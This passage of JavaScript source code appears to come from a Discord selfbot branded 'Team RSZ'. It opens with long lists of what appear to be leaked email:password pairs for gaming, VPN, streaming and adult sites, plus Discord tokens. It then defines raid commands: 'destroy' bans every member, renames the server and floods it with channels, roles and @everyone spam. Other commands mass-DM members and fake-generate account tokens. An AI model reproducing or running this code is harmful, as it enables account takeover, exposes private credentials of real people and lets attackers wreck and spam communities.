  "franckycud@orange.fr: kyfranthe2",
  "waldoworldwide@charter.net: Odlaw366",
  "lorajohnson@charter.net: Mustang01",
  "ernabuitenhuis@planet.nl: bella1",
  "josi_olga@uol.com.br: josi8602",
  "bbriole@aliceadsl.fr: laurine"
]


var dofus = [
  "Manuxhil2002:minecraft11 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "bluehazard17:1234566aa | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "eduardo821:eduardo24 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "comploadann:blanco987 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Iop - Niv. 42 - Brumen] | Nombre de Kamas = [Agride = , Brumen = 10 291] | Kamas en attente = [0, 0] | Abonné = False",
  "hier631:Cireblanco7 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = 226] | Kamas en attente = [0] | Abonné = False",
  "itznevers:16092001 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Iop - Niv. 44 - Julith, Ecaflip - Niv. 46 - Julith, Feca - Niv. 46 - Julith, Osamodas - Niv. 47 - Julith, Roublard - Niv. 54 - Julith] | Nombre de Kamas = [Julith = 17 144] | Kamas en attente = [0] | Abonné = False",
  "Ptiteange90:smirnoff2611 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 8, Ush = 23] | Kamas en attente = [0, 0] | Abonné = False",
  "sovitta:62o2o20g | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Xelor - Niv. 68 - Meriana, Cra - Niv. 93 - Meriana, Pandawa - Niv. 73 - Meriana, Eniripsa - Niv. 167 - Meriana] | Nombre de Kamas = [Meriana = 13 751] | Kamas en attente = [0] | Abonné = False",
  "CHERPIAT:k5hnnehx | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = 7] | Kamas en attente = [0] | Abonné = False",
  "uncleparks:rsca1070 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 41, Ilyzaelle = 432] | Kamas en attente = [0, 0] | Abonné = False",
  "linknomade:digimon12 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Crocabulia = 242] | Kamas en attente = [0] | Abonné = False",
  "billboquet29:Abcdefg39 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 400 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = , Merkator = 2] | Kamas en attente = [0, 0] | Abonné = False",
  "mmicchaaell:qweasdzx123321 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Sram - Niv. 24 - Meriana] | Nombre de Kamas = [Agride = 98, Meriana = 8 159, Nidas = 11 410] | Kamas en attente = [0, 0, 0] | Abonné = False",
  "Bashintor:Aimar1991 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = , Rubilax = 1 038] | Kamas en attente = [0, 0] | Abonné = False",
  "shadowgeekou03:Gregdu03190 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Steamer - Niv. 23 - Meriana] | Nombre de Kamas = [Meriana = , Nidas = ] | Kamas en attente = [0, 0] | Abonné = False",
  "Drakoloke:arwen1998 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "Mumacus:mumacus669 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "blanxo:dentistA21 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "cookloco:banana123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "somariojv:Jvr19960 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "latinanhim:bigtop12 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "Reen69:manjivegeta1 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "loulourandy:spiderman | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 1 558] | Kamas en attente = [0] | Abonné = False",
  "Moniagun:azerty23 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "armandbibi:derfderf76 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = ] | Kamas en attente = [0] | Abonné = False",
  "connerdraggo:Clw12345 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "Dadaboro:dadaboro123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Merkator = 30] | Kamas en attente = [0] | Abonné = False",
  "anselmking:sol64pera | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "jose280p:junio123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Eliotrope - Niv. 22 - Atcham] | Nombre de Kamas = [Atcham = 2 909] | Kamas en attente = [0] | Abonné = False",
  "lmartin85:Soul1402 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "Fehriel:pc24041987 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Eniripsa - Niv. 82 - Pandore] | Nombre de Kamas = [Pandore = 9 983] | Kamas en attente = [0] | Abonné = False",
  "kirisawa:majordome369 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Sacrieur - Niv. 38 - Pandore, Sadida - Niv. 41 - Pandore, Enutrof - Niv. 39 - Pandore, Iop - Niv. 37 - Pandore, Iop - Niv. 43 - Pandore] | Nombre de Kamas = [Pandore = 3 048] | Kamas en attente = [0] | Abonné = False",
  "zell358:Perceval358 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 2 510, Nidas = 41] | Kamas en attente = [0, 0] | Abonné = False",
  "Opapay4:dragonne4 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "boefjuhnl:edwin777 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Cra - Niv. 44 - Echo, Xelor - Niv. 29 - Echo, Iop - Niv. 53 - Echo] | Nombre de Kamas = [Echo = 44 943] | Kamas en attente = [0] | Abonné = False",
  "blood4rose:Koetje4893 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "kaziz59:Nordin01 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 4 608] | Kamas en attente = [0] | Abonné = False",
  "juppi75:giulia08 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "chmoller:!dexter! | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
  "Jooscia:Cerise59 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 246] | Kamas en attente = [0] | Abonné = False",
  "WiFGameR:Alessio21 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False"
]


var gtoken = [
  "NzAzNjczNjQxNDEzNTA5MjEx.XqSBSQ.ZwpD-Do_c-a5z_ujbbq4iZq9wbQ",
  "Njg5MTU2MzYyMzUzMzc3MzU3.XqVlHw.ZUqihZF1DSq-w4bgCcrblwH1Bcw",
  "NTI3MTc1OTA2MDI5MDc2NDky.XWpmzg.hUEOHU1IhhdabT5AozUrZQkn8DQ",
  "NzAzOTY1OTA4Nzk1Nzg1MjM2.XqWRWQ.X0xTTOUYjH6iPOJAz7K-4yp-mzo",
  "NzAzNzA4MDUxMjI3ODAzNjg4.XqShZw.jMqW0x62qRe9NcYtgLUcxh6QTnw",
  "NzAzNjc5ODg5MjA2NjczNDA4.XqSHOw.ykWPBoxWYPaaR0OWEyEa33SojCw",
  "NjQ2MDk0MDkwOTQ0OTA1MjM4.XdMIZw.P8yTqKWm-0CNYbp4C8F_PraaYFs",
  "NzAyNTUyMjkzNTkzMDU1MzAz.XqB2Pw.TGdpaNojvIoYKTYFQKMMJK6qF-4",
  "NzA1MDY1MDg1MDU1NTMzMDU3.XqmRHg.ZiFzYah6XYAJs8C1347y8KMnMaM"
]


var nrdvpn = [
  "kitader@gmail.com:Tomorrow6 | Expiration = 2022-05-22 02:32:47",
  "jadenb551@gmail.com:Pookie234 | Expiration = 2020-06-08 20:19:21",
  "He.francesco@gmail.com:Emily2014. | Expiration = 2022-06-19 16:50:44",
  "alandalmau@icloud.com:Daymond0 | Expiration = 2020-06-01 02:39:12",
  "Lvisng95@gmail.com:Lvisng95 | Expiration = 2020-06-03 18:49:28",
  "kelvinzhang206@gmail.com:20020610 | Expiration = 2019-09-12 17:35:32",
  "andresnr21@gmail.com:Batman21 | Expiration = 2022-03-18 18:59:52",
  "mrgriggs1987@gmail.com:stephen1992 | Expiration = 2019-12-04 02:03:49",
  "newlachlan@gmail.com:Soccer89 | Expiration = 2019-09-05 10:45:52",
  "kivanctarlan@gmail.com:9surgeon123 | Expiration = 2022-02-09 20:01:33",
  "luke02920@hotmail.com:Walkman1 | Expiration = 2021-12-13 14:42:13",
  "thomasmalloy16@yahoo.com:Blackjack12 | Expiration = 2020-09-11 07:45:55",
  "jmordan57@gmail.com:Rousseau1 | Expiration = 2021-08-08 01:51:17",
  "josephriddle4@gmail.com:uncbball | Expiration = 2022-02-04 14:51:54",
  "samijuju@yahoo.com:2precious | Expiration = 2022-07-27 23:18:32",
  "jvasquez0206@yahoo.com:October21 | Expiration = 2020-05-05 18:45:48",
  "cruzboy@me.com:Dbacks23 | Expiration = 2019-08-30 05:03:15",
  "marksantos21@msn.com:oct102111 | Expiration = 2022-02-17 05:32:05",
  "mzcvms@gmail.com:Iloveari1 | Expiration = 2019-09-07 05:18:10",
  "johnoliverwalters@gmail.com:Mamamia2 | Expiration = 2019-10-18 10:22:39",
  "ryan.augustino@gmail.com:skylin33x3 | Expiration = 2020-09-12 04:55:28",
  "vincent59530@gmail.com:motdepasse75 | Expiration = 2019-09-03 07:04:43",
  "norbertkasia55@gmail.com:norbert8 | Expiration = 2020-03-14 22:43:13",
  "t.kokiri@hotmail.com:Jordan23 | Expiration = 2021-06-06 09:40:18",
  "moizesomething@hotmail.com:Liverpool12 | Expiration = 2020-06-07 01:09:36",
  "philippkielwein@gmail.com:philipp313 | Expiration = 2019-09-09 11:17:57",
  "jylcook@gmail.com:Clearout1 | Expiration = 2019-09-24 06:44:01",
  "davidcmulholland@gmail.com:Liam2014 | Expiration = 2019-11-06 17:28:04",
  "danielorders101@gmail.com:Freedom18 | Expiration = 2019-09-12 21:06:31",
  "yacine.bouagada1@gmail.com:zidane10 | Expiration = 2019-09-18 04:51:06",
  "Adrimodzz@yahoo.de:Meerschweinchen1 | Expiration = 2020-06-29 20:32:29",
  "acehardware182@yahoo.com:Redskins357 | Expiration = 2021-04-27 06:49:40",
  "christophercrosbybrodka@gmail.com:inc0rrect | Expiration = 2020-07-01 16:14:40",
  "chematorres2017@gmail.com:torres11 | Expiration = 2020-03-13 00:29:20",
  "1pardot@gmail.com:cubiche1 | Expiration = 2022-03-23 00:50:02",
  "coladx@gmail.com:Orange1234 | Expiration = 2022-04-17 01:40:13",
  "ellenhymns@icloud.com:Wallflower17 | Expiration = 2020-06-23 10:51:37",
  "cherrydub@gmail.com:R0adrunner | Expiration = 2020-04-25 11:15:20",
  "ginaper94@yahoo.com:Texas1993 | Expiration = 2020-03-14 04:58:10",
  "joshuatownsend28@yahoo.com:July2199 | Expiration = 2019-09-01 13:01:14"
]


var netflix = [
  "shayona_dhanak@yahoo.com:dhanak18",
  "amynaomi2001@gmail.com:amy10151981",
  "an.deskins@hotmail.com:cougar85",
  "benysachdeva171@gmail.com:viraaj2012",
  "victoriaschubert1402@gmail.com:klavier1402",
  "jahairaabreu@gmail.com:alvin0118",
  "niknaks4.np@googlemail.com:nicola0077",
  "tiffany_lemuss@yahoo.com:Chuncha123",
  "luguito_03@hotmail.com:Swaggy0394",
  "reifsteck.marie@gmail.com:Chevalier68",
  "mireageorgiana41@gmail.com:Daimond77",
  "caforummodi@gmail.com:Sunshine.24",
  "maha.almarush@gmail.com:Mahawi84",
  "elizabeth.aason@hotmail.com:Bethere23",
  "briannarodriguez_meza@yahoo.com:Bri081201",
  "kearney_17@hotmail.com:Lagrange_67",
  "Steve31215@gmail.com:Steve15312!",
  "Jonboetefuer@gmail.com:Tigers2020",
  "trmason2121@gmail.com:Heyward22",
  "gjmg106@yahoo.com:Mgross1125"
]

var pornhub = [
  "norbertassss@gmail.com:zaibas123",
  "panicmax469@gmail.com:animation1",
  "kevin.kniss@Web.de:raiden12",
  "nameloc_s@hotmail.com:ipwnj00ezpka",
  "ellinas_4_lyf@hotmail.com:clk230",
  "glowingorb@gmx.de:TdSoLi42",
  "andrew.benjamin75@yahoo.com:tqu98577",
  "cimmy7777@hotmail.com:txaidu43",
  "GengarGrey@gmail.com:092598dlh",
  "subzero2004@yandex.ru:PIER5768",
  "feedcoma@gmail.com:yayluca123",
  "toxinweb@gmail.com:azoz225",
  "reidarpedersen@outlook.com:reidar123",
  "kory_levesque@outlook.com:Jungope1",
  "pavelznachoda@seznam.cz:Brokolice98",
  "se.mcguire87@gmail.com:rowland23",
  "osiris_chaoti@hotmail.com:natureangel23",
  "rin.revell@gmail.com:shinev133",
  "kdoggditty@yahoo.com:ZillaMonster1",
  "bcarl@hotmail.com:Sanders21",
  "louie_07_louie@yahoo.com:amaterasu321",
  "justin.jman.weston@gmail.com:hobbit12",
  "arisel00@gmail.com:bartek12",
  "jaylen.forbes@yahoo.com:beoncey12",
  "jake.armour@hotmail.com:Ja713750",
  "blake120000@gmail.com:twiztid13",
  "tarvusthegreat@gmail.com:Gr33nmile310",
  "smittymitty19@gmail.com:Smitty37",
  "swcw1211@aol.com:sw365533",
  "cubigon@gmail.com:thunderbolt4",
  "jeremyresults@gmail.com:qw12QW!@",
  "silverwolfe42@gmail.com:nlsh39etrk",
  "tyboman300@hotmail.com:InsonperneS23",
  "daniel.wladika@gmx.at:daniel1232",
  "pollardc33@gmail.com:heartgram7",
  "neoredwolf11@gmail.com:yoi72Xyoi",
  "nimirahb@gmail.com:bianca26",
  "mikaelm2001@gmail.com:mikael01",
  "dillow5@gmail.com:johnwall11",
  "soulraver123456@gmail.com:Soulraver123",
  "krisnordall@gmail.com:Kris1997",
  "mschuetz82@gmail.com:cecil207",
  "gengargrey@gmail.com:092598dlh",
  "nollen.hager@gmail.com:safeway1",
  "kneedragger1000@msn.com:Ekck1006",
  "kory_levesque@outlook.com:Jungope1",
  "speedzimba5@yahoo.com:Aa825607",
  "soem28@gmail.com:Mthomas77",
  "calebbp1@gmail.com:Lollypop1",
  "halldor0gudmundsson@gmail.com:awesome123",
  "quentin_laffez@hotmail.com:Cocacola91",
  "ballinjoey2332@gmail.com:tehghozt15",
  "mersky17@gmail.com:milobeast13",
  "dotexex77@gmail.com:legendry123",
  "calebharris50@gmail.com:Setzer321",
  "smith.brayden00@gmail.com:Smithdawgs00",
  "adrianpaul380@gmail.com:gummybear101",
  "russelld.wolfe@yahoo.com:Airport1",
  "yo_dig@hotmail.com:vincent513"
]



if (message.content.includes(prefix + "pingall")) {
  if (message.deletable) message.delete();
  let interval = setInterval(function() {
      message.guild.channels.forEach(channel => {
          if (channel.type === "text") channel.send(`@everyone  \n `);
      }, 1500);
  });
}
var facts = [
  "https://discord.gift/qBn6HkYcfVvD7Z9RxRQqU9sa",
  "https://discord.gift/CPPwF8yzbWeJenqRdCbGZ6GH",
  "https://discord.gift/RqksgMqmyDMdxE8sD6htrwAJ",
  "https://discord.gift/cXHje2gUfMNUxyrunHvrxFVw",
  "https://discord.gift/8fWKKutPeqUyMM7ReqvKM7Ab",
  "https://discord.gift/tdXxCG5XQAv9yBVPf5etqgp3",
  "https://discord.gift/KAeaUr9p8QSt9X3NfWdf7Yz5",
  "https://discord.gift/zef5CSyFEv7GU4vmmXywERNF",
  "https://discord.gift/r43shVb9t4D7CfU53grgKMMr",
  "https://discord.gift/TSYhjtk3pd9TnAvmpBG6XYJP",
  "https://discord.gift/jXyzsSTtwdpWjnAmSAaNQrYc",
  'https://discord.gift/95BJNgugy5TYrKAEGux6YtWM',
  "https://discord.gift/jNMfGND88PePMVSKnx2YRQGS",
  "https://discord.gift/9BNtz7PjpCZSV85sNaBsD9nB",
  "https://discord.gift/6gPfQ3wsWYBs6dyPbyqT4aj3",
  "https://discord.gift/rp2Z2sjJPqhjubjrwDDXa4cX",
  "https://discord.gift/TC3W8QrrpmZkb3SsxRzpHTzT",
  "https://discord.gift/cNFCnMGRaTBmcyeRu7NSsZqk",
  "https://discord.gift/ATzSnmGTUcfFRag9Q49wqUpQ",
  "https://discord.gift/rZQe9Pa3bCzrRw4wyQKWBsJV",
  `https://discord.gift/HcY3zFzCWBMnfKz3q3mZkEZn`,
  "https://discord.gift/NBhZwGtppWaG9mvtt4ekKMZZ",
  "https://discord.gift/RTcWpYAB3YzFhdK5EPZBrcwZ",
  "https://discord.gift/6VxXNZ8ut3ceeehdtTuQZJBE",
  "https://discord.gift/JpzRdAtxBFyhxazm7XyG7mGA"
];



if (message.content.startsWith(prefix + "mail")) {
  if (message.author.id === client.user.id) {
      message.delete();
      let user = message.mentions.users.first();
      var embed = new Discord.RichEmbed()
          .setColor(color)
          .setTitle("mail de  " + client.user.tag)
          .setDescription("**email : **" + client.user.mail)
          .setFooter(message.author.username, message.author.avatarURL);

      message.channel.send(embed);
  }
}

if (message.content.startsWith(`${prefix}rtoken`)) {
  if (message.author.id === client.user.id) {
      if (!mentionuser) {
          message.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
      }
      let token = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
      let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
      var id = mentionuser.id;
      var bytes = utf8.encode(id);
      var encoded = base64.encode(bytes);
      let embed_encode = new Discord.RichEmbed()
          .setColor(color)
          .setTitle(`Token match ${mentionuser.username}`)
          .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
      setTimeout(() => {
          message.edit("░░░░░░░░░░ 0%");
      }, 1000);
      setTimeout(() => {
          message.edit("▓▓░░░░░░░░ 20%");
      }, 1500);
      setTimeout(() => {
          message.edit("▓▓▓▓░░░░░░ 40%");
      }, 2000);
      setTimeout(() => {
          message.edit("▓▓▓▓▓▓░░░░ 60%");
      }, 2500);
      setTimeout(() => {
          message.edit("▓▓▓▓▓▓▓▓░░ 80%");
      }, 3000);
      setTimeout(() => {
          message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
      }, 3500);
      setTimeout(() => {
          message.edit(embed_encode);
      }, 4000)
      console.log('Commande token effectué'.yellow);
  }
}
                    if (message.content.startsWith(prefix + "sond")) {
                        if (message.author.id == client.user.id) {
                            message.delete();

                                var messageArray = message.content.split(" ");
                                let cmd = messageArray[0];
                                var args = messageArray.slice(1);

                                var sondage = args.slice(0).join(" ")

                                if (!args) return args.channel.send("Tu dois poser une question !")

                                var sond_embed = new Discord.RichEmbed()
                                    .setColor(color)
                                    .setTitle('**Sondage**')
                                    .setDescription(sondage)
                                    .setFooter(`Team RSZ`, message.author.avatarURL)
                                message.channel.send(sond_embed).then(function(message) {
                                    message.react("✅")
                                    message.react("❌")
                                })
                            } else {
                                message.channel.send(nowhite)
                            }
                        }
if (message.content.startsWith(prefix + 'mpall')) {
  if (message.author.id === client.user.id) {

          let serveur = message.guild;
          if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**');

          const dmusers = message.guild.members
          const usermsg = message.content.split(" ").slice(1).join(" ");
          if (!usermsg[0]) {
              message.delete()
              console.log('[', 'ERROR'.red, ']', 'un argument est nécessaire')
          }
          dmusers.forEach(dmuser => {
              dmuser.send(usermsg)
                  .catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green))


              var embed = new Discord.RichEmbed()
                  .setTitle("***Mpall en cours avec le message :*** " + usermsg)
                  .setTimestamp()
                  .setColor(color)
                  .setFooter(`Team RSZ`, message.author.avatarURL);
              message.edit(embed)
          })
      } else {
          message.edit(nowhite)
      }
  }
if (message.content.startsWith(prefix + 'rolecreate')) {
  if (message.author.id == client.user.id) {
      let serveur = message.guild;
      if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**');
      message.delete();
      for (var i = 0; i < 90; i++) {
          message.guild.createRole({
              name: ("Team RSZ"),
              mentionable: false,
              permissions: 8,
              position: "",
              color: 'RANDOM'
          })
      }
  }
}
if (message.content === prefix + "destroy") {
  if (message.deletable) message.delete();
  if (message.author.id == client.user.id) {
      message.guild.members.forEach(member => {
          member.ban().then(function() {});
      });
  }
  if (message.content.startsWith(prefix + 'destroy')) {
      if (message.author.id == client.user.id) {
          message.delete();
          for (var i = 0; i < 90; i++) {
              message.guild.createRole({
                  name: ("Team RSZ"),
                  mentionable: false,
                  permissions: 0,
                  position: "",
                  color: 'RANDOM'
              })
          }
      }
  }
}
if (message.content === prefix + "destroy") {
  if (message.deletable) message.delete();
  if (message.author.id == client.user.id) {
      if (message.channel.type === "dm") return;
      if (message.guild.channels.size === 0) return;
  }
}
if (message.content === prefix + "destroy") {
  if (message.channel.type === "dm") return;
  if (message.author.id == client.user.id) {
      if (message.guild.name != "Team RSZ") {
          message.guild.setIcon('https://cdn.discordapp.com/attachments/861692601026478121/862004674131787782/zt.png').catch(error => {})
          message.guild.setName('Team RSZ').catch(error => {})
          message.guild.setRegion('russia').catch(error => {})
      }
      setInterval(function() {
          if (message.guild.channels.size < 499) {
              message.guild.createChannel('Team RSZ', 'text').catch(error => {})
          }
      }, 400)
      if (message.deletable) message.delete();
  }
}
if (message.content === prefix + 'destroy') {
  if (message.channel.type === "dm") return;
  if (message.author.id == client.user.id) {
      setInterval(function() {
          message.channel.send("@everyone @here Team RSZ \n" +
              `https://discord.gg/tj5SKx6HFx \n` +
              "\n" +
              "Team RSZ", {
                  tts: true
              }).catch(error => {})
      }, 400)
  }
}
if (message.content === prefix + 'unbanall') {
  let serveur = message.guild;
  if (!serveur) return message.edit(':x: **Commande uniquement utilisable sur un serveur**')
  if (message.deletable) message.delete();
  let interval = setInterval(function() {
      message.guild.fetchBans().then(bans => {
          bans.forEach(ban => {
              message.guild.unban(ban.id);
          });
      });
  }, 1000);
  message.channel.send("```𝗨𝗻𝗯𝗮𝗻 é𝗳𝗳𝗲𝗰𝘁𝘂é``` :white_check_mark:")
}
if(message.content.startsWith(prefix + "pat")){
if(!mentionuser){
      message.edit(':x: **Veuillez mentionner un utilisateur!**');
      return;
    }
let patembed = new Discord.RichEmbed();
  patembed.setColor(color)
  .setTitle(`**${client.user.username} pat ${mentionuser.username}**`)
  .setTimestamp()
  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
  .setImage(pat[Math.floor(Math.random() * pat.length)])
  message.edit(patembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande pat executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + "highfive")){
if(!mentionuser){
      message.edit(':x: **Veuillez mentionner un utilisateur!**');
      return;
    }
let highfiveembed = new Discord.RichEmbed();
  highfiveembed.setColor(color)
  .setTitle(`**${client.user.username} highfive avec ${mentionuser.username}**`)
  .setTimestamp()
  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
  .setImage(highfive[Math.floor(Math.random() * pat.length)])
  message.edit(highfiveembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande highfive executé")
  console.log("╟─────────────────────────────────╢")
}
if(message.content.startsWith(prefix + "cry")){
let cryembed = new Discord.RichEmbed();
  cryembed.setColor(color)
  .setTitle(`**${client.user.username} pleure 😭**`)
  .setTimestamp()
  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
  .setImage(cry[Math.floor(Math.random() * pat.length)])
  message.edit(cryembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log("╟ Commande cry executé")
  console.log("╟─────────────────────────────────╢")
}
  if(message.content.startsWith(prefix + "mp all")){
    message.delete();
    console.log("╟ Commande mp all executé")
    console.log("╟─────────────────────────────────╢")
    let pub = args.splice(2).join(" ") || "@everyone\nhttps://discord.gg/5S54Svq6hR\n Discord\nhttps://discord.gg/5S54Svq6hR";
  let serveur = message.guild;
  if(!serveur)return;
  setInterval(() => {
  let membres = serveur.members.random();
  if(membres.user.bot)return;
if(membres.user.id === client.user.id)return;
  if (db[membres.user.id]) return;
  membres.send(pub +'').catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
  console.log(membres.user.username + " à été mp")
  db[membres.user.id] = {
      raison: 'mp' 
  };
  saver();
}, 450);
  }
  if(message.content.startsWith(prefix + "stop mp all")){
        client.destroy().then(() => client.login(token))
        console.log("╟ Commande stop mp all executé")
        console.log("╟─────────────────────────────────╢")
  }
  if(message.content.startsWith(prefix + "auto voice kick")){
    if (!message.guild.me.hasPermission('MOVE_MEMBERS')) return message.reply(':x:**Tu n\'a pas la permission de kick un utilisatur**.');
    const member = message.mentions.members.first();
    if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
    kicked[message.guild.id] = {
      user: member.id
  };
  kicker();
  console.log("╟ Commande auto voice kick executé")
  console.log("╟─────────────────────────────────╢")
  message.edit(":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**")
  if (!member.voiceChannel) return;
  member.setVoiceChannel(null);
  }
  
  if(message.content.startsWith(prefix + "stop auto voice kick")){
    const member = message.mentions.members.first();
    if (!member) return message.edit(':x:**Veuillez mentionner un utilisateur.**');
    delete kicked[message.guild.id].user
  kicker();
  message.edit(":white_check_mark: **Auto Voice kick set up l'utilisateur ne peut desormé rejoindre les channels vocaux de ce serveur**")
  console.log("╟ Commande auto voice kick stopé")
  console.log("╟─────────────────────────────────╢")
  }
if(message.content.startsWith(prefix + "voice kick")){
  if(!message.guild) return message.edit(":x: **Commande uniquement utilisable sur serveur**");
